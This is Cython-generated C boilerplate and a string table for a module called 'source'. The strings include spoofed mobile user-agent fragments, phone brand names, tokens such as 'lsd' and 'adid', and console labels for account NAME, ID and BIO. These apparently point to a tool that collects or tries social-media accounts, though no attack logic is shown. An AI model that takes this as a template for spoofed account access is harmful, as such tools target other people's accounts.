#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* PyObjectLookupSpecial.proto */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* SwapException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PySequenceContains.proto */
static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* RaiseTooManyValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);

/* RaiseNeedMoreValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);

/* IterFinish.proto */
static CYTHON_INLINE int __Pyx_IterFinish(void);

/* UnpackItemEndCheck.proto */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected);

/* PyUnicodeContains.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_ContainsTF(PyObject* substring, PyObject* text, int eq) {
    int result = PyUnicode_Contains(text, substring);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* PyObjectFormatSimple.proto */
#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_str(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_str(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif

/* IncludeStringH.proto */
#include <string.h>

/* JoinPyUnicode.proto */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);

/* PyIntBinop.proto */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif

/* BytesEquals.proto */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);

/* UnicodeEquals.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);

/* py_dict_keys.proto */
static CYTHON_INLINE PyObject* __Pyx_PyDict_Keys(PyObject* d);

/* UnpackUnboundCMethod.proto */
typedef struct {
    PyObject *type;
    PyObject **method_name;
    PyCFunction func;
    PyObject *method;
    int flag;
} __Pyx_CachedCFunction;

/* CallUnboundCMethod0.proto */
static PyObject* __Pyx__CallUnboundCMethod0(__Pyx_CachedCFunction* cfunc, PyObject* self);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_CallUnboundCMethod0(cfunc, self)\
    (likely((cfunc)->func) ?\
        (likely((cfunc)->flag == METH_NOARGS) ?  (*((cfunc)->func))(self, NULL) :\
         (PY_VERSION_HEX >= 0x030600B1 && likely((cfunc)->flag == METH_FASTCALL) ?\
            (PY_VERSION_HEX >= 0x030700A0 ?\
                (*(__Pyx_PyCFunctionFast)(void*)(PyCFunction)(cfunc)->func)(self, &__pyx_empty_tuple, 0) :\
                (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)(cfunc)->func)(self, &__pyx_empty_tuple, 0, NULL)) :\
          (PY_VERSION_HEX >= 0x030700A0 && (cfunc)->flag == (METH_FASTCALL | METH_KEYWORDS) ?\
            (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)(cfunc)->func)(self, &__pyx_empty_tuple, 0, NULL) :\
            (likely((cfunc)->flag == (METH_VARARGS | METH_KEYWORDS)) ?  ((*(PyCFunctionWithKeywords)(void*)(PyCFunction)(cfunc)->func)(self, __pyx_empty_tuple, NULL)) :\
               ((cfunc)->flag == METH_VARARGS ?  (*((cfunc)->func))(self, __pyx_empty_tuple) :\
               __Pyx__CallUnboundCMethod0(cfunc, self)))))) :\
        __Pyx__CallUnboundCMethod0(cfunc, self))
#else
#define __Pyx_CallUnboundCMethod0(cfunc, self)  __Pyx__CallUnboundCMethod0(cfunc, self)
#endif

/* dict_getitem_default.proto */
static PyObject* __Pyx_PyDict_GetItemDefault(PyObject* d, PyObject* key, PyObject* default_value);

/* CallUnboundCMethod1.proto */
static PyObject* __Pyx__CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg);
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg);
#else
#define __Pyx_CallUnboundCMethod1(cfunc, self, arg)  __Pyx__CallUnboundCMethod1(cfunc, self, arg)
#endif

/* CallUnboundCMethod2.proto */
static PyObject* __Pyx__CallUnboundCMethod2(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg1, PyObject* arg2);
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030600B1
static CYTHON_INLINE PyObject *__Pyx_CallUnboundCMethod2(__Pyx_CachedCFunction *cfunc, PyObject *self, PyObject *arg1, PyObject *arg2);
#else
#define __Pyx_CallUnboundCMethod2(cfunc, self, arg1, arg2)  __Pyx__CallUnboundCMethod2(cfunc, self, arg1, arg2)
#endif

/* SetNameInClass.proto */
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? _PyDict_SetItem_KnownHash(ns, name, value, ((PyASCIIObject *) name)->hash) : PyObject_SetItem(ns, name, value))
#elif CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? PyDict_SetItem(ns, name, value) : PyObject_SetItem(ns, name, value))
#else
#define __Pyx_SetNameInClass(ns, name, value)  PyObject_SetItem(ns, name, value)
#endif

/* SliceObject.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(
        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,
        int has_cstart, int has_cstop, int wraparound);

/* CalculateMetaclass.proto */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases);

/* Py3ClassCreate.proto */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name, PyObject *qualname,
                                           PyObject *mkw, PyObject *modname, PyObject *doc);
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases, PyObject *dict,
                                      PyObject *mkw, int calculate_metaclass, int allow_py2_metaclass);

/* FetchCommonType.proto */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);

/* PyIntCompare.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, long intval, long inplace);

/* None.proto */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname);

/* PyObject_GenericGetAttrNoDict.proto */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GenericGetAttrNoDict PyObject_GenericGetAttr
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportFrom.proto */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);

/* ListAppend.proto */
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_PyList_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len) & likely(len > (L->allocated >> 1))) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_PyList_Append(L,x) PyList_Append(L,x)
#endif

/* PyObjectGetMethod.proto */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);

/* PyObjectCallMethod1.proto */
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);

/* append.proto */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x);

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* RaiseException.proto */
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause);

/* CoroutineBase.proto */
typedef PyObject *(*__pyx_coroutine_body_t)(PyObject *, PyThreadState *, PyObject *);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_ExcInfoStruct  _PyErr_StackItem
#else
typedef struct {
    PyObject *exc_type;
    PyObject *exc_value;
    PyObject *exc_traceback;
} __Pyx_ExcInfoStruct;
#endif
typedef struct {
    PyObject_HEAD
    __pyx_coroutine_body_t body;
    PyObject *closure;
    __Pyx_ExcInfoStruct gi_exc_state;
    PyObject *gi_weakreflist;
    PyObject *classobj;
    PyObject *yieldfrom;
    PyObject *gi_name;
    PyObject *gi_qualname;
    PyObject *gi_modulename;
    PyObject *gi_code;
    PyObject *gi_frame;
    int resume_label;
    char is_running;
} __pyx_CoroutineObject;
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
    PyTypeObject *type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
    PyObject *name, PyObject *qualname, PyObject *module_name);
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name);
static CYTHON_INLINE void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *self);
static int __Pyx_Coroutine_clear(PyObject *self);
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value);
static PyObject *__Pyx_Coroutine_Close(PyObject *self);
static PyObject *__Pyx_Coroutine_Throw(PyObject *gen, PyObject *args);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_Coroutine_SwapException(self)
#define __Pyx_Coroutine_ResetAndClearException(self)  __Pyx_Coroutine_ExceptionClear(&(self)->gi_exc_state)
#else
#define __Pyx_Coroutine_SwapException(self) {\
    __Pyx_ExceptionSwap(&(self)->gi_exc_state.exc_type, &(self)->gi_exc_state.exc_value, &(self)->gi_exc_state.exc_traceback);\
    __Pyx_Coroutine_ResetFrameBackpointer(&(self)->gi_exc_state);\
    }
#define __Pyx_Coroutine_ResetAndClearException(self) {\
    __Pyx_ExceptionReset((self)->gi_exc_state.exc_type, (self)->gi_exc_state.exc_value, (self)->gi_exc_state.exc_traceback);\
    (self)->gi_exc_state.exc_type = (self)->gi_exc_state.exc_value = (self)->gi_exc_state.exc_traceback = NULL;\
    }
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__pyx_tstate, pvalue)
#else
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, pvalue)
#endif
static int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *tstate, PyObject **pvalue);
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state);

/* PatchModuleWithCoroutine.proto */
static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code);

/* PatchGeneratorABC.proto */
static int __Pyx_patch_abc(void);

/* Generator.proto */
#define __Pyx_Generator_USED
static PyTypeObject *__pyx_GeneratorType = 0;
#define __Pyx_Generator_CheckExact(obj) (Py_TYPE(obj) == __pyx_GeneratorType)
#define __Pyx_Generator_New(body, code, closure, name, qualname, module_name)\
    __Pyx__Coroutine_New(__pyx_GeneratorType, body, code, closure, name, qualname, module_name)
static PyObject *__Pyx_Generator_Next(PyObject *self);
static int __pyx_Generator_init(void);

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
static PyTypeObject *__pyx_ptype_6source___pyx_scope_struct__genexpr = 0;
static PyTypeObject *__pyx_ptype_6source___pyx_scope_struct_1_genexpr = 0;
static PyTypeObject *__pyx_ptype_6source___pyx_scope_struct_2_genexpr = 0;
static PyTypeObject *__pyx_ptype_6source___pyx_scope_struct_3_genexpr = 0;
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static PyObject *__pyx_builtin_BaseException;
static PyObject *__pyx_builtin_print;
static PyObject *__pyx_builtin_input;
static PyObject *__pyx_builtin_range;
static PyObject *__pyx_builtin_open;
static const char __pyx_k_0[] = "?0";
static const char __pyx_k_1[] = "1";
static const char __pyx_k_4[] = "4";
static const char __pyx_k_A[] = "A";
static const char __pyx_k_B[] = "B";
static const char __pyx_k_C[] = "C";
static const char __pyx_k_E[] = "E";
static const char __pyx_k_F[] = "F";
static const char __pyx_k_G[] = "G";
static const char __pyx_k_M[] = "M";
static const char __pyx_k_Q[] = "Q";
static const char __pyx_k_R[] = "R";
static const char __pyx_k_S[] = "S";
static const char __pyx_k_U[] = "U";
static const char __pyx_k_X[] = "X";
static const char __pyx_k_Y[] = "Y";
static const char __pyx_k_Z[] = "Z";
static const char __pyx_k_a[] = "a";
static const char __pyx_k_e[] = "e";
static const char __pyx_k_f[] = "f";
static const char __pyx_k_h[] = " h ";
static const char __pyx_k_k[] = "k";
static const char __pyx_k_o[] = "o";
static const char __pyx_k_r[] = "r";
static const char __pyx_k_t[] = "t";
static const char __pyx_k_x[] = "x";
static const char __pyx_k_0m[] = "\033[0m";
static const char __pyx_k_1m[] = "\033[1m";
static const char __pyx_k_3f[] = "{:.3f}";
static const char __pyx_k_8T[] = "8T";
static const char __pyx_k_AQ[] = "AQ==";
static const char __pyx_k_ID[] = "ID";
static const char __pyx_k_TL[] = "TL";
static const char __pyx_k_Z1[] = "Z1";
static const char __pyx_k__4[] = "";
static const char __pyx_k__5[] = "*/*";
static const char __pyx_k__6[] = "\"\"";
static const char __pyx_k__8[] = "[\"";
static const char __pyx_k__9[] = "\",\"";
static const char __pyx_k_aa[] = "aa";
static const char __pyx_k_cc[] = "cc";
static const char __pyx_k_dd[] = "dd";
static const char __pyx_k_dp[] = "dp";
static const char __pyx_k_gg[] = "gg";
static const char __pyx_k_ii[] = "ii";
static const char __pyx_k_jj[] = "jj";
static const char __pyx_k_ki[] = "ki";
static const char __pyx_k_mo[] = "mo";
static const char __pyx_k_n1[] = "n1";
static const char __pyx_k_n2[] = "n2";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_pp[] = "pp";
static const char __pyx_k_re[] = "re";
static const char __pyx_k_rr[] = "rr";
static const char __pyx_k_ss[] = "ss";
static const char __pyx_k_tl[] = "tl";
static const char __pyx_k_tv[] = "tv";
static const char __pyx_k_ua[] = "ua";
static const char __pyx_k_yy[] = "yy";
static const char __pyx_k_0_2[] = "0";
static const char __pyx_k_1_2[] = "?1";
static const char __pyx_k_356[] = "356";
static const char __pyx_k_91m[] = "\033[91m";
static const char __pyx_k_92m[] = "\033[92m";
static const char __pyx_k_93m[] = "\033[93m";
static const char __pyx_k_94m[] = "\033[94m";
static const char __pyx_k_95m[] = "\033[95m";
static const char __pyx_k_96m[] = "\033[96m";
static const char __pyx_k_BIO[] = " \357\264\277\n\360\237\224\255 BIO        : \357\264\276 ";
static const char __pyx_k_Bio[] = "Bio";
static const char __pyx_k_HTC[] = "HTC";
static const char __pyx_k_N_A[] = "N/A";
static const char __pyx_k_RED[] = "RED";
static const char __pyx_k_XZ2[] = "XZ2";
static const char __pyx_k_ZTE[] = "ZTE";
static const char __pyx_k__11[] = "\"";
static const char __pyx_k__13[] = "//";
static const char __pyx_k__14[] = "\n";
static const char __pyx_k__16[] = "@";
static const char __pyx_k__19[] = "\"}";
static const char __pyx_k__23[] = "/";
static const char __pyx_k__33[] = "\n\n";
static const char __pyx_k__34[] = "\360\235\227\227\360\235\227\230\360\235\227\251\360\235\227\230\360\235\227\237\360\235\227\242\360\235\227\243\360\235\227\230\360\235\227\245";
static const char __pyx_k__35[] = "\360\235\227\226\360\235\227\233\360\235\227\224\360\235\227\241\360\235\227\241\360\235\227\230\360\235\227\237";
static const char __pyx_k__36[] = "; ";
static const char __pyx_k__37[] = ")";
static const char __pyx_k__43[] = ".";
static const char __pyx_k__44[] = "{}";
static const char __pyx_k__48[] = ";";
static const char __pyx_k__49[] = "\n\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\n\n\360\235\227\233\360\235\227\234\360\235\227\247\360\235\227\246 : ";
static const char __pyx_k__50[] = "\n\360\235\227\225\360\235\227\224\360\235\227\227 \360\235\227\234\360\235\227\241\360\235\227\246\360\235\227\247\360\235\227\224 :  ";
static const char __pyx_k__51[] = "\n\360\235\227\225\360\235\227\224\360\235\227\227 \360\235\227\230\360\235\227\240\360\235\227\224\360\235\227\234\360\235\227\237 : ";
static const char __pyx_k__52[] = "\n\n\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\342\226\260\342\226\261\n";
static const char __pyx_k__60[] = "_";
static const char __pyx_k__67[] = "\n\n                      ";
static const char __pyx_k_app[] = "app";
static const char __pyx_k_arm[] = "arm";
static const char __pyx_k_bad[] = "bad";
static const char __pyx_k_car[] = "car";
static const char __pyx_k_cls[] = "cls";
static const char __pyx_k_csr[] = "csr";
static const char __pyx_k_dnt[] = "dnt";
static const char __pyx_k_doc[] = "__doc__";
static const char __pyx_k_dpi[] = "dpi; ";
static const char __pyx_k_get[] = "get";
static const char __pyx_k_he3[] = "he3";
static const char __pyx_k_hex[] = "hex";
static const char __pyx_k_ids[] = "ids";
static const char __pyx_k_lan[] = "lan";
static const char __pyx_k_lop[] = "lop";
static const char __pyx_k_lsd[] = "lsd";
static const char __pyx_k_md5[] = "md5";
static const char __pyx_k_mid[] = "mid";
static const char __pyx_k_ms4[] = "ms4";
static const char __pyx_k_num[] = "num";
static const char __pyx_k_res[] = "res";
static const char __pyx_k_rnd[] = "rnd";
static const char __pyx_k_sos[] = "sos";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_tll[] = "tll";
static const char __pyx_k_tok[] = "tok";
static const char __pyx_k_u_3[] = "u=3";
static const char __pyx_k_url[] = "url";
static const char __pyx_k_uui[] = "uui";
static const char __pyx_k_vlo[] = "vlo";
static const char __pyx_k_x86[] = "x86";
static const char __pyx_k_2010[] = "2010";
static const char __pyx_k_2011[] = "2011";
static const char __pyx_k_2012[] = "2012";
static const char __pyx_k_2013[] = "2013";
static const char __pyx_k_2014[] = "2014";
static const char __pyx_k_2015[] = "2015";
static const char __pyx_k_2016[] = "2016";
static const char __pyx_k_2017[] = "2017";
static const char __pyx_k_2018[] = "2018";
static const char __pyx_k_2019[] = "2019";
static const char __pyx_k_28_9[] = "28/9";
static const char __pyx_k_ASUS[] = "ASUS";
static const char __pyx_k_BIZZ[] = "{BIZZ}";
static const char __pyx_k_BLUE[] = "BLUE";
static const char __pyx_k_BOLD[] = "BOLD";
static const char __pyx_k_BRed[] = "BRed";
static const char __pyx_k_CYAN[] = "CYAN";
static const char __pyx_k_Host[] = "Host";
static const char __pyx_k_ID_2[] = " \357\264\277\n\360\237\233\270 ID         : \357\264\276 ";
static const char __pyx_k_META[] = " \357\264\277\n\360\237\223\241 META       : \357\264\276 ";
static const char __pyx_k_NAME[] = "\n\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201 \342\234\246 \360\237\232\200 \342\234\246 \342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\342\224\201\n\360\237\214\214 NAME       : \357\264\276 ";
static const char __pyx_k_Name[] = "Name";
static const char __pyx_k_OPPO[] = "OPPO";
static const char __pyx_k_Rest[] = "Rest";
static const char __pyx_k_SM_T[] = "; SM-T";
static const char __pyx_k_SONY[] = "SONY";
static const char __pyx_k_True[] = "True";
static const char __pyx_k_VIVO[] = "VIVO";
static const char __pyx_k_WIFI[] = "WIFI";
static const char __pyx_k_YEAR[] = " \357\264\277\n\360\237\252\220 YEAR       : \357\264\276 ";
static const char __pyx_k_adid[] = "adid";
static const char __pyx_k_args[] = "args";
static const char __pyx_k_blue[] = "blue";
